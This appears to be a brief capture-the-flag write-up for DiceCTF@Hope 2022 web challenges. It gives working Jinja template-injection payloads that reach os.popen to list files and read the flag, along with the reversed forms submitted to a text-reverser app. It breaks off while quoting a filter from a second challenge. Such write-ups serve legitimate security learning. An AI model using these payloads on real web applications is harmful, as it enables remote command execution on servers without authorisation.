item.title: DiceCTF@Hope 2022 - Writeup
item.description: Mostly solved the web challenges with Task_Hashed Reverser the website is a text reverser and from the source code we can tell its an SSTI so we just have to put a regular SSTI payload but just reversed regular payload: {{config.__class__.__init__.__globals__['os'].popen('ls').read()}} {{config.__class__.__init__.__globals__['os'].popen('cat flag-ccba9605-afeb-49a6-8aac-d56bac20705b.txt').read()}} supplied reversed payload: }} )(daer.)'sl'(nepop.]'so'[__slabolg__.__tini__.__ssalc__.gifnoc {{ }})(daer.)'txt.b50702cab65d-caa8-6a94-befa-5069abcc-galf tac'(nepop.]'so'[__slabolg__.__tini__.__ssalc__.gifnoc{{ Pastebin the important part of this challenge is : if (paste.search(/<.*>/) !== -1) { return res.redirect('/flash?message=Illegal characters in paste!
